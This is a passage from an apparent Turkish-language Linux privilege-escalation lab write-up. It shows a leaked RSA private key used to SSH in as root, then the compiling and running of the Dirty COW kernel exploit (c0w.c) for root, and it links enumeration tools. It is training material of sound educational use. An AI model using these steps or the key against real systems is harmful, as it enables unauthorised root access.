Z36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2
NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ
YaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+
5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el
WUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7
VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7
6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW
1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K
824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6
Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc
U7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1
Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi
SXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV
d+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im
jQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa
871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok
X2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4
CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN
Whp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4
LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==
-----END RSA PRIVATE KEY-----
```

Bu key değerini kendi bilgisayarımıza id\_rsa adıyla kayıt ediyoruz. SSH bağlantısı yaparken -i parametresiyle bu dosyayı bildireceğiz ve giriş yapacağız. Yeni bir dosya açıp SSH ile bağlanmaya çalıştığımızda sistem bize hata vericektir. Dosya olarak oluşturduğumuz key değerini herkesin görmemesi gerektiğini söyleyip dosya üzerinde izinleri değiştirmemiz gerekiyor.

```
root@ip-10-10-101-154:~# ssh root@10.10.48.240 -i id_rsa 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
```

```
root@ip-10-10-101-154:~# chmod 700 id_rsa 
root@ip-10-10-101-154:~# ssh root@10.10.48.240 -i id_rsa 
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 25 14:02:49 2019 from 192.168.1.2
root@debian:~# whoami
root
```

### Kernel Exploit

Kernel exploit, sistemi kararsız bir durumda bırakabilir; bu nedenle bunları yalnızca son çare olarak çalıştırmalısınız.

Kullandığımız çekirdeğin zafiyetli olup olmadığını öğrenmek için öncelikle hangi çekirdek versiyonunu kullandığımızı öğrenmemiz gerekiyor.&#x20;

```
user@debian:/.ssh$ uname -a
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
```

Google'da `2.6.32-5 linux`  kelimesini arattığımızda karşımıza Dirty Cow adında bir exploit çıkıyor. Exploiti /home/user/tools/kernel-exploits/dirtycow dizini altında c0w.c adıyla bulunuyor.

```
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
```

Komutuyla derledikten sonra ./c0w diyerek çalıştırıyoruz. Komut tamamlandıktan sonra passwd komutuyla root yetkilerine sahip oluyoruz.

### Hazır Scriptler

Hedef sistemlerde yaptığımız bu manuel taramaları yazılmış çeşitli otomatik araçlarla yapabiliriz.

{% embed url="https://github.com/rebootuser/LinEnum" %}

{% embed url="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS" %}

{% embed url="https://github.com/jondonas/linux-exploit-suggester-2" %}

{% embed url="https://tryhackme.com/r/room/linuxprivesc" %}
